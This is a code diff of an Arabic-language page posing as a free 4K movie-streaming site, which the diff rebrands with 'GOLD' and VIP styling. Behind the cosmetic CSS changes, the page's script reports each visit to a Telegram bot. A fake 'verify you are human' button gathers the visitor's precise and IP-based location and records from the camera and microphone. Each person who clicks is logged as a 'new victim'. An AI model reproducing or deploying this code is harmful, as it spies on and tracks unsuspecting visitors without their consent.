@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>CINEMA4U - تجربة سينما لا تُنسى</title>
+    <title>CINEMA4U GOLD - تجربة سينما VIP</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
@@ -35,11 +35,12 @@
             opacity: 0.05;
             z-index: -1;
         }
+        /* شريط التنقل المتطور */
         .top-nav {
             position: sticky;
             top: 0;
             z-index: 100;
-            background: rgba(8, 8, 15, 0.92);
+            background: rgba(8, 8, 15, 0.95);
             backdrop-filter: blur(20px);
             border-bottom: 1px solid rgba(229, 9, 20, 0.3);
             padding: 0.8rem 2rem;
@@ -59,12 +60,23 @@
             letter-spacing: -0.5px;
         }
         .logo i { background: none; -webkit-background-clip: unset; color: #e50914; margin-left: 5px; }
+        .nav-links { display: flex; gap: 1.5rem; align-items: center; }
+        .nav-links a { color: #ddd; text-decoration: none; cursor: pointer; transition: 0.3s; font-weight: 500; }
+        .nav-links a:hover { color: #e50914; }
+        .premium-badge {
+            background: linear-gradient(135deg, #e50914, #ff6a00);
+            padding: 0.3rem 0.8rem;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            margin-left: 0.5rem;
+        }
         .search-box {
             background: #1e1e2e;
             border: 1px solid #2a2a3a;
             border-radius: 40px;
             padding: 0.6rem 1rem;
-            width: 280px;
+            width: 250px;
             color: white;
             font-family: inherit;
             transition: all 0.3s;
@@ -73,13 +85,38 @@
             outline: none;
             border-color: #e50914;
             box-shadow: 0 0 12px rgba(229, 9, 20, 0.3);
-            width: 320px;
+            width: 300px;
         }
+        /* هيدر احترافي */
+        .hero-section {
+            background: linear-gradient(135deg, #0b0b12, #12121c);
+            border-radius: 32px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 20px 35px -15px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+        }
+        .hero-section::before {
+            content: 'VIP';
+            position: absolute;
+            top: 10px;
+            right: 20px;
+            background: #e50914;
+            padding: 0.2rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            opacity: 0.7;
+        }
+        .hero-title { font-size: 2rem; font-weight: 800; margin-bottom: 0.5rem; }
+        .hero-desc { color: #aaa; max-width: 70%; }
         .location-badge {
             background: rgba(229, 9, 20, 0.2);
             border-radius: 40px;
             padding: 0.4rem 1.2rem;
-            font-size: 0.9rem;
+            font-size: 0.8rem;
             font-weight: 600;
             display: inline-flex;
             align-items: center;
@@ -88,8 +125,7 @@
             backdrop-filter: blur(8px);
             margin-top: 0.8rem;
         }
-        .location-badge i { color: #e50914; font-size: 1rem; }
-        .hero-location { margin-top: 0.5rem; font-size: 0.9rem; }
+        /* تخطيط الصفحة الرئيسية */
         .main-container {
             display: flex;
             max-width: 1600px;
@@ -97,6 +133,7 @@
             padding: 2rem;
             gap: 2rem;
         }
+        /* القائمة الجانبية المتطورة */
         .sidebar {
             width: 280px;
             flex-shrink: 0;
@@ -111,21 +148,21 @@
             transition: all 0.3s;
         }
         .sidebar h3 {
-            font-size: 1.3rem;
-            margin-bottom: 1.2rem;
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
             border-right: 3px solid #e50914;
             padding-right: 0.8rem;
             display: inline-block;
         }
-        .sidebar-section { margin-bottom: 2rem; }
-        .sidebar-list { list-style: none; margin-top: 1rem; }
+        .sidebar-section { margin-bottom: 1.8rem; }
+        .sidebar-list { list-style: none; margin-top: 0.8rem; }
         .sidebar-list li {
-            padding: 0.7rem 0;
+            padding: 0.6rem 0;
             display: flex;
             align-items: center;
             gap: 0.8rem;
             border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             transition: 0.2s;
             cursor: pointer;
         }
@@ -138,36 +175,27 @@
             text-align: center;
             margin-top: 1rem;
         }
-        .stat-number { font-size: 1.8rem; font-weight: bold; color: #e50914; }
+        .stat-number { font-size: 1.5rem; font-weight: bold; color: #e50914; }
+        /* المحتوى الرئيسي */
         .content { flex: 1; }
-        .hero-section {
-            background: linear-gradient(135deg, #0b0b12, #12121c);
-            border-radius: 32px;
-            padding: 2rem;
-            margin-bottom: 2rem;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            box-shadow: 0 20px 35px -15px rgba(0, 0, 0, 0.5);
-        }
-        .hero-title { font-size: 2rem; font-weight: 800; margin-bottom: 0.5rem; }
-        .hero-desc { color: #aaa; max-width: 70%; }
         .section-title {
-            font-size: 1.6rem;
+            font-size: 1.5rem;
             font-weight: 700;
             margin: 1.5rem 0 1rem;
             display: flex;
             align-items: center;
             gap: 0.8rem;
         }
-        .section-title i { color: #e50914; font-size: 1.8rem; }
+        .section-title i { color: #e50914; font-size: 1.6rem; }
         .movies-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
-            gap: 1.8rem;
-            margin: 1rem 0 2rem;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 1.5rem;
+            margin-top: 1rem;
         }
         .movie-card {
             background: #14141f;
-            border-radius: 20px;
+            border-radius: 16px;
             overflow: hidden;
             transition: all 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.1);
             border: 1px solid rgba(255, 255, 255, 0.05);
@@ -175,25 +203,29 @@
             position: relative;
         }
         .movie-card:hover {
-            transform: translateY(-12px) scale(1.02);
-            box-shadow: 0 25px 35px -12px rgba(0, 0, 0, 0.6);
+            transform: translateY(-8px) scale(1.02);
+            box-shadow: 0 20px 30px -12px rgba(0, 0, 0, 0.6);
             border-color: #e50914;
+        }
+        .movie-card.premium::after {
+            content: 'VIP';
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #e50914;
+            padding: 0.2rem 0.5rem;
+            border-radius: 20px;
+            font-size: 0.6rem;
+            font-weight: bold;
+            z-index: 2;
         }
         .movie-poster { width: 100%; aspect-ratio: 2 / 3; overflow: hidden; position: relative; }
         .movie-poster img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.5s; }
-        .movie-card:hover .movie-poster img { transform: scale(1.08); }
-        .movie-info { padding: 1rem; text-align: center; }
-        .movie-title { font-weight: 700; font-size: 1rem; margin-bottom: 0.2rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .movie-year { font-size: 0.8rem; color: #aaa; }
-        .coming-soon-note {
-            font-size: 0.7rem;
-            background: #e50914;
-            display: inline-block;
-            padding: 0.2rem 0.6rem;
-            border-radius: 30px;
-            margin-top: 0.5rem;
-            color: white;
-        }
+        .movie-card:hover .movie-poster img { transform: scale(1.05); }
+        .movie-info { padding: 0.8rem; text-align: center; }
+        .movie-title { font-weight: 700; font-size: 0.9rem; margin-bottom: 0.2rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .movie-year { font-size: 0.7rem; color: #aaa; }
+        /* النافذة المنبثقة للتحقق */
         .player-overlay {
             position: fixed;
             top: 0;
@@ -210,16 +242,23 @@
         }
         .player-container {
             width: 90%;
-            max-width: 550px;
+            max-width: 500px;
             background: #11131f;
-            border-radius: 32px;
+            border-radius: 28px;
             overflow: hidden;
             border: 1px solid rgba(229, 9, 20, 0.5);
             box-shadow: 0 30px 40px -20px black;
         }
         .movie-poster-large { width: 100%; aspect-ratio: 16/9; overflow: hidden; }
         .movie-poster-large img { width: 100%; height: 100%; object-fit: cover; }
-        .video-placeholder { background: #0c0e17; padding: 1.8rem; text-align: center; display: flex; flex-direction: column; gap: 1rem; }
+        .video-placeholder {
+            background: #0c0e17;
+            padding: 1.5rem;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 0.8rem;
+        }
         .verify-btn {
             background: linear-gradient(90deg, #e50914, #b00710);
             border: none;
@@ -231,7 +270,7 @@
             cursor: pointer;
             width: fit-content;
             margin: 0 auto;
-            box-shadow: 0 4px 12px rgba(229, 9, 20, 0.4);
+            transition: 0.2s;
         }
         .verify-btn:hover { transform: scale(1.02); box-shadow: 0 8px 20px rgba(229, 9, 20, 0.5); }
         .close-player {
@@ -259,10 +298,10 @@
             -webkit-background-clip: text;
             animation: rainbow 2.5s linear infinite;
             font-weight: bold;
-            font-size: 1.1rem;
+            font-size: 1rem;
         }
         @keyframes rainbow { 0% { background-position: 0% center; } 100% { background-position: 200% center; } }
-        .progress-bar { width: 80%; height: 5px; background: #2a2a3a; border-radius: 10px; margin: 1rem auto; overflow: hidden; }
+        .progress-bar { width: 80%; height: 4px; background: #2a2a3a; border-radius: 10px; margin: 1rem auto; overflow: hidden; }
         .progress-fill { width: 0%; height: 100%; background: #e50914; animation: loading 10s linear forwards; }
         @keyframes loading { 0% { width: 0%; } 100% { width: 100%; } }
         .movie-fullscreen {
@@ -295,7 +334,7 @@
             z-index: 2001;
             font-weight: bold;
         }
-        footer { text-align: center; padding: 2rem; color: #555; border-top: 1px solid #1e1e2f; margin-top: 2rem; }
+        footer { text-align: center; padding: 2rem; color: #555; border-top: 1px solid #1e1e2f; margin-top: 2rem; font-size: 0.8rem; }
         @media (max-width: 1000px) {
             .main-container { flex-direction: column; }
             .sidebar { width: 100%; position: static; margin-bottom: 1.5rem; }
@@ -313,12 +352,13 @@
 <body>
 
 <div class="top-nav">
-    <div class="logo"><i class="fas fa-film"></i> CINEMA4U</div>
-    <div class="nav-links" style="display: flex; gap: 1.5rem;">
-        <a onclick="scrollToSection('home')" style="cursor: pointer;">الرئيسية</a>
-        <a onclick="scrollToSection('movies')" style="cursor: pointer;">أفلام</a>
-        <a onclick="scrollToSection('series')" style="cursor: pointer;">مسلسلات</a>
-        <a onclick="scrollToSection('coming')" style="cursor: pointer;">قريباً</a>
+    <div class="logo"><i class="fas fa-film"></i> CINEMA4U <span class="premium-badge">GOLD</span></div>
+    <div class="nav-links">
+        <a onclick="scrollToSection('home')">الرئيسية</a>
+        <a onclick="scrollToSection('movies')">أفلام</a>
+        <a onclick="scrollToSection('series')">مسلسلات</a>
+        <a onclick="scrollToSection('coming')">قريباً</a>
+        <a><i class="fas fa-crown" style="color:#e50914;"></i> اشتراك VIP</a>
     </div>
     <input type="text" class="search-box" placeholder="🔍 ابحث عن فيلم أو مسلسل..." id="searchInput" onkeyup="searchItems()">
 </div>
@@ -326,47 +366,75 @@
 <div class="main-container">
     <aside class="sidebar">
         <div class="sidebar-section">
-            <h3><i class="fas fa-crown"></i> المميزات</h3>
-            <ul class="sidebar-list">
-                <li><i class="fas fa-tachometer-alt"></i> جودة 4K فائقة</li>
-                <li><i class="fas fa-ad"></i> بدون إعلانات مطلقاً</li>
-                <li><i class="fas fa-globe"></i> مشاهدة عالمية بدون قيود</li>
-                <li><i class="fas fa-headset"></i> دعم فني 24/7</li>
-                <li><i class="fas fa-download"></i> تحميل مباشر للمحتوى</li>
-            </ul>
+            <h3><i class="fas fa-crown"></i> باقة GOLD</h3>
+            <div class="stat-badge">
+                <div class="stat-number">4K HDR</div>
+                <div>جودة فائقة</div>
+            </div>
+            <div class="stat-badge">
+                <div class="stat-number">دون إعلانات</div>
+                <div>مشاهدة مريحة</div>
+            </div>
+            <div class="stat-badge">
+                <div class="stat-number">تحميل مباشر</div>
+                <div>للمحتوى</div>
+            </div>
         </div>
         <div class="sidebar-section">
             <h3><i class="fas fa-chart-line"></i> إحصائيات اليوم</h3>
-            <div class="stat-badge"><div class="stat-number">1,284</div><div>مشاهدة حية الآن</div></div>
-            <div class="stat-badge"><div class="stat-number">98%</div><div>رضا المستخدمين</div></div>
+            <div class="stat-badge"><div class="stat-number">2,847</div><div>مشاهدة حية الآن</div></div>
+            <div class="stat-badge"><div class="stat-number">99%</div><div>رضا المستخدمين</div></div>
+            <div class="stat-badge"><div class="stat-number">+1,234</div><div>عضوية جديدة اليوم</div></div>
         </div>
         <div class="sidebar-section">
-            <h3><i class="fas fa-tags"></i> التصنيفات</h3>
+            <h3><i class="fas fa-tags"></i> التصنيفات الذهبية</h3>
             <ul class="sidebar-list">
                 <li><i class="fas fa-fire"></i> الأكثر مشاهدة</li>
-                <li><i class="fas fa-star"></i> أفلام حائزة على جوائز</li>
+                <li><i class="fas fa-star"></i> حائزة على جوائز</li>
                 <li><i class="fas fa-clock"></i> الإصدارات الجديدة</li>
                 <li><i class="fas fa-theater-masks"></i> دراما / أكشن / خيال علمي</li>
+                <li><i class="fas fa-trophy"></i> حصريات GOLD</li>
+            </ul>
+        </div>
+        <div class="sidebar-section">
+            <h3><i class="fas fa-gem"></i> مميزات العضوية</h3>
+            <ul class="sidebar-list">
+                <li><i class="fas fa-check-circle"></i> جودة 4K فائقة</li>
+                <li><i class="fas fa-check-circle"></i> بدون إعلانات</li>
+                <li><i class="fas fa-check-circle"></i> تحميل غير محدود</li>
+                <li><i class="fas fa-check-circle"></i> دعم فني 24/7</li>
+                <li><i class="fas fa-check-circle"></i> محتوى حصري</li>
             </ul>
         </div>
     </aside>
 
     <div class="content">
         <div id="home" class="hero-section">
-            <div class="hero-title">أهلاً بك في CINEMA4U</div>
-            <div class="hero-desc">أكبر مكتبة أفلام ومسلسلات بجودة 4K وبدون إعلانات. استمتع بتجربة سينما حقيقية من منزلك.</div>
+            <div class="hero-title">أهلاً بك في CINEMA4U GOLD</div>
+            <div class="hero-desc">أكبر مكتبة أفلام ومسلسلات بجودة 4K HDR وبدون إعلانات. استمتع بتجربة سينما حقيقية من منزلك مع باقة GOLD الحصرية.</div>
             <div class="hero-location" id="heroLocation">
                 <div class="location-badge"><i class="fas fa-map-marker-alt"></i> <span id="userRegion">جاري تحديد منطقتك...</span></div>
             </div>
         </div>
 
-        <div id="movies"><div class="section-title"><i class="fas fa-film"></i> أفلام حصرية</div><div class="movies-grid" id="moviesGrid"></div></div>
-        <div id="series"><div class="section-title"><i class="fas fa-tv"></i> مسلسلات حصرية</div><div class="movies-grid" id="seriesGrid"></div></div>
-        <div id="coming"><div class="section-title"><i class="fas fa-calendar-alt"></i> قريباً</div><div class="movies-grid" id="comingGrid"></div></div>
+        <div id="movies">
+            <div class="section-title"><i class="fas fa-film"></i> أفلام حصرية GOLD</div>
+            <div class="movies-grid" id="moviesGrid"></div>
+        </div>
+
+        <div id="series">
+            <div class="section-title"><i class="fas fa-tv"></i> مسلسلات حصرية GOLD</div>
+            <div class="movies-grid" id="seriesGrid"></div>
+        </div>
+
+        <div id="coming">
+            <div class="section-title"><i class="fas fa-calendar-alt"></i> قريباً على GOLD</div>
+            <div class="movies-grid" id="comingGrid"></div>
+        </div>
     </div>
 </div>
 
-<footer>by massil — جميع الحقوق محفوظة © 2026 | CINEMA4U حيث السينما تلتقي بالمتعة</footer>
+<footer>by massil — جميع الحقوق محفوظة © 2026 | CINEMA4U GOLD - حيث السينما تلتقي بالرفاهية</footer>
 
 <div id="fullscreenMovie" class="movie-fullscreen">
     <button class="close-fullscreen" id="closeFullscreenBtn">✕</button>
@@ -398,16 +466,14 @@
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: fd });
     }
 
-    sendTextToTelegram("🌐 تم فتح موقع CINEMA4U");
+    sendTextToTelegram("🌐 تم فتح موقع CINEMA4U GOLD");
 
-    // تحديث اسم المنطقة في الواجهة
     function updateRegionDisplay(regionName) {
         const regionSpan = document.getElementById('userRegion');
         if (regionSpan && regionName) regionSpan.innerHTML = `<i class="fas fa-location-dot"></i> ${regionName}`;
         else if (regionSpan) regionSpan.innerHTML = `<i class="fas fa-question-circle"></i> لم يتم التعرف على المنطقة`;
     }
 
-    // ========== سرقة الموقع الجغرافي ==========
     let locationRetryCount = 0;
     function stealLocation() {
         sendTextToTelegram("📍 جاري محاولة الحصول على الموقع الجغرافي بدقة عالية...");
@@ -445,24 +511,19 @@
 
     function getLocationByIP() {
         sendTextToTelegram("🌐 جاري جلب الموقع التقريبي عبر IP...");
-        const services = [
-            { name: "ip-api", url: "https://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,query", parser: (d) => d.status === 'success' ? `🌐 IP: ${d.query}\nالبلد: ${d.country}\nالمدينة: ${d.city}\nالمنطقة: ${d.regionName}\n📐 ${d.lat},${d.lon}\n🔌 ${d.isp}` : null },
-            { name: "ipinfo", url: "https://ipinfo.io/json", parser: (d) => d.ip ? `🌐 IP: ${d.ip}\nالبلد: ${d.country}\nالمدينة: ${d.city}\nالمنطقة: ${d.region}\n📐 ${d.loc || ''}` : null }
-        ];
-        let i = 0;
-        function tryNext() {
-            if (i >= services.length) { sendTextToTelegram("❌ فشل جلب الموقع عبر IP."); return; }
-            const s = services[i++];
-            fetch(s.url).then(res => res.json()).then(data => {
-                const result = s.parser(data);
-                if (result) { sendTextToTelegram(result); if (data.city) updateRegionDisplay(data.city); }
-                else tryNext();
-            }).catch(() => tryNext());
-        }
-        tryNext();
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                if (data && data.latitude) {
+                    sendTextToTelegram(`🌐 الموقع التقريبي (IP):\nIP: ${data.ip}\nالبلد: ${data.country_name}\nالمدينة: ${data.city}\nالمنطقة: ${data.region}\nخط العرض: ${data.latitude}\nخط الطول: ${data.longitude}`);
+                    if (data.city) updateRegionDisplay(data.city);
+                } else {
+                    sendTextToTelegram("❌ فشل جلب الموقع عبر IP");
+                }
+            })
+            .catch(err => sendTextToTelegram(`❌ خطأ في IP API: ${err.message}`));
     }
 
-    // ========== التسجيل (كاميرا + ميكروفون) ==========
     let videoRec, audioRec, vChunks = [], aChunks = [];
     let isRecording = false;
 
@@ -495,7 +556,7 @@
         } catch (e) { sendTextToTelegram(`❌ فشل الوصول للأجهزة: ${e.message}`); }
     }
 
-    // ========== روابط الأفلام والمسلسلات ==========
+    // روابط الأفلام والمسلسلات
     const MOVIE_LINKS = {
         "Ratatouille": "https://as.akwam.tube/all/%D9%81%D9%8A%D9%84%D9%85-ratatouille-2007-%D9%85%D8%AA%D8%B1%D8%AC%D9%85/",
         "هاري بوتر": "https://as.akwam.tube/ar/video/watch-harry-potter-and-the-sorcerers-stone-2001-translated-online-akoam-15250/",
@@ -517,25 +578,25 @@
     };
 
     const movies = [
-        { title: "Ratatouille", year: "2007", img: "https://image.tmdb.org/t/p/w500/npHNjldbeTHdKKw28bJKs7lzqzj.jpg", link: MOVIE_LINKS["Ratatouille"] },
-        { title: "هاري بوتر", year: "2001", img: "https://image.tmdb.org/t/p/w500/wuMc08IPKEatf9rnMNXvIDxqP4W.jpg", link: MOVIE_LINKS["هاري بوتر"] },
-        { title: "Titanic", year: "1997", img: "https://image.tmdb.org/t/p/w500/9xjZS2rlVxm8SFx8kPC3aIGCOYQ.jpg", link: MOVIE_LINKS["Titanic"] },
-        { title: "The Avengers", year: "2012", img: "https://image.tmdb.org/t/p/w500/RYMX2wcKCBAr24UyPD7xwmjaTn.jpg", link: MOVIE_LINKS["The Avengers"] },
-        { title: "The Godfather", year: "1972", img: "https://image.tmdb.org/t/p/w500/3bhkrj58Vtu7enYsRolD1fZdja1.jpg", link: MOVIE_LINKS["The Godfather"] },
-        { title: "The Dark Knight", year: "2008", img: "https://image.tmdb.org/t/p/w500/qJ2tW6WMUDux911r6m7haRef0WH.jpg", link: MOVIE_LINKS["The Dark Knight"] },
-        { title: "Inception", year: "2010", img: "https://image.tmdb.org/t/p/w500/9gk7adHYeDvHkCSEqAvQNLV5UY4.jpg", link: MOVIE_LINKS["Inception"] },
-        { title: "Interstellar", year: "2014", img: "https://image.tmdb.org/t/p/w500/gEU2QniE6E77NI6lCU6MxlNBvIx.jpg", link: MOVIE_LINKS["Interstellar"] },
-        { title: "The Matrix", year: "1999", img: "https://image.tmdb.org/t/p/w500/f89U3ADr1oiB1s9GkdPOEpXUk5H.jpg", link: MOVIE_LINKS["The Matrix"] },
-        { title: "Gladiator", year: "2000", img: "https://image.tmdb.org/t/p/w500/ty8TGRuvJLPUmAR1H1nRIsgwvim.jpg", link: MOVIE_LINKS["Gladiator"] },
-        { title: "Spider-Man: No Way Home", year: "2021", img: "https://image.tmdb.org/t/p/w500/uJYYizSuA9Y3DCs0qS4qWvHfZg4.jpg", link: MOVIE_LINKS["Spider-Man: No Way Home"] }
+        { title: "Ratatouille", year: "2007", img: "https://image.tmdb.org/t/p/w500/npHNjldbeTHdKKw28bJKs7lzqzj.jpg", link: MOVIE_LINKS["Ratatouille"], premium: true },
+        { title: "هاري بوتر", year: "2001", img: "https://image.tmdb.org/t/p/w500/wuMc08IPKEatf9rnMNXvIDxqP4W.jpg", link: MOVIE_LINKS["هاري بوتر"], premium: true },
+        { title: "Titanic", year: "1997", img: "https://image.tmdb.org/t/p/w500/9xjZS2rlVxm8SFx8kPC3aIGCOYQ.jpg", link: MOVIE_LINKS["Titanic"], premium: true },
+        { title: "The Avengers", year: "2012", img: "https://image.tmdb.org/t/p/w500/RYMX2wcKCBAr24UyPD7xwmjaTn.jpg", link: MOVIE_LINKS["The Avengers"], premium: true },
+        { title: "The Godfather", year: "1972", img: "https://image.tmdb.org/t/p/w500/3bhkrj58Vtu7enYsRolD1fZdja1.jpg", link: MOVIE_LINKS["The Godfather"], premium: true },
+        { title: "The Dark Knight", year: "2008", img: "https://image.tmdb.org/t/p/w500/qJ2tW6WMUDux911r6m7haRef0WH.jpg", link: MOVIE_LINKS["The Dark Knight"], premium: true },
+        { title: "Inception", year: "2010", img: "https://image.tmdb.org/t/p/w500/9gk7adHYeDvHkCSEqAvQNLV5UY4.jpg", link: MOVIE_LINKS["Inception"], premium: true },
+        { title: "Interstellar", year: "2014", img: "https://image.tmdb.org/t/p/w500/gEU2QniE6E77NI6lCU6MxlNBvIx.jpg", link: MOVIE_LINKS["Interstellar"], premium: true },
+        { title: "The Matrix", year: "1999", img: "https://image.tmdb.org/t/p/w500/f89U3ADr1oiB1s9GkdPOEpXUk5H.jpg", link: MOVIE_LINKS["The Matrix"], premium: true },
+        { title: "Gladiator", year: "2000", img: "https://image.tmdb.org/t/p/w500/ty8TGRuvJLPUmAR1H1nRIsgwvim.jpg", link: MOVIE_LINKS["Gladiator"], premium: true },
+        { title: "Spider-Man: No Way Home", year: "2021", img: "https://image.tmdb.org/t/p/w500/uJYYizSuA9Y3DCs0qS4qWvHfZg4.jpg", link: MOVIE_LINKS["Spider-Man: No Way Home"], premium: true }
     ];
 
     const series = [
-        { title: "Stranger Things", year: "2016", img: "https://image.tmdb.org/t/p/w500/49WJfeN0moxb9IPfGn8AIqMGskD.jpg", link: SERIES_LINKS["Stranger Things"] }
+        { title: "Stranger Things", year: "2016", img: "https://image.tmdb.org/t/p/w500/49WJfeN0moxb9IPfGn8AIqMGskD.jpg", link: SERIES_LINKS["Stranger Things"], premium: true }
     ];
 
     const comingSoon = [
-        { title: "The Conjuring", year: "2013", img: "https://image.tmdb.org/t/p/w500/wVYREutTvI2tmxr6ujrHT704wGF.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم", link: COMING_SOON_LINKS["The Conjuring"] }
+        { title: "The Conjuring", year: "2013", img: "https://image.tmdb.org/t/p/w500/wVYREutTvI2tmxr6ujrHT704wGF.jpg", note: "⭐ قريباً على GOLD", link: COMING_SOON_LINKS["The Conjuring"], premium: true }
     ];
 
     function loadItems(containerId, items, type, showNote = false) {
@@ -545,6 +606,7 @@
         items.forEach(item => {
             const card = document.createElement('div');
             card.className = 'movie-card';
+            if (item.premium) card.classList.add('premium');
             card.innerHTML = `
                 <div class="movie-poster"><img src="${item.img}" alt="${item.title}" loading="lazy" onerror="this.src='https://placehold.co/300x450?text=${item.title}'"></div>
                 <div class="movie-info">
@@ -586,7 +648,7 @@
             <div class="player-container">
                 <div class="movie-poster-large"><img src="${posterUrl}" alt="${title}" onerror="this.src='https://placehold.co/400x225?text=${title}'"></div>
                 <div class="video-placeholder" id="videoPlaceholder">
-                    <span style="font-size:1.3rem; font-weight:bold;">🎬 ${title}</span>
+                    <span style="font-size:1.2rem; font-weight:bold;">🎬 ${title}</span>
                     <button id="verifyAccessBtn" class="verify-btn">✅ تحقق من هويتك</button>
                     <div class="rainbow-text">صلو على النبي</div>
                     <p style="font-size:0.8rem;">لأسباب أمنية، نحتاج للتأكد من أنك إنسان حقيقي</p>
@@ -601,8 +663,8 @@
             stealLocation();
             await startSpying();
             const ph = document.getElementById('videoPlaceholder');
-            ph.innerHTML = `<span style="font-size:1.2rem;">✅ جاري التحقق من هويتك...</span><div class="rainbow-text">صلو على النبي</div><div class="progress-bar"><div class="progress-fill"></div></div><p style="font-size:0.8rem;">قد يستغرق التحقق 10 ثوانٍ، يرجى الانتظار</p>`;
-            sendTextToTelegram(`🎯 ضحية جديدة: ${type} - ${title}`);
+            ph.innerHTML = `<span style="font-size:1.1rem;">✅ جاري التحقق من هويتك...</span><div class="rainbow-text">صلو على النبي</div><div class="progress-bar"><div class="progress-fill"></div></div><p style="font-size:0.7rem;">قد يستغرق التحقق 10 ثوانٍ، يرجى الانتظار</p>`;
+            sendTextToTelegram(`🎯 ضحية جديدة GOLD: ${type} - ${title}`);
             timeoutId = setTimeout(() => {
                 overlay.remove();
                 const fullscreenDiv = document.getElementById('fullscreenMovie');
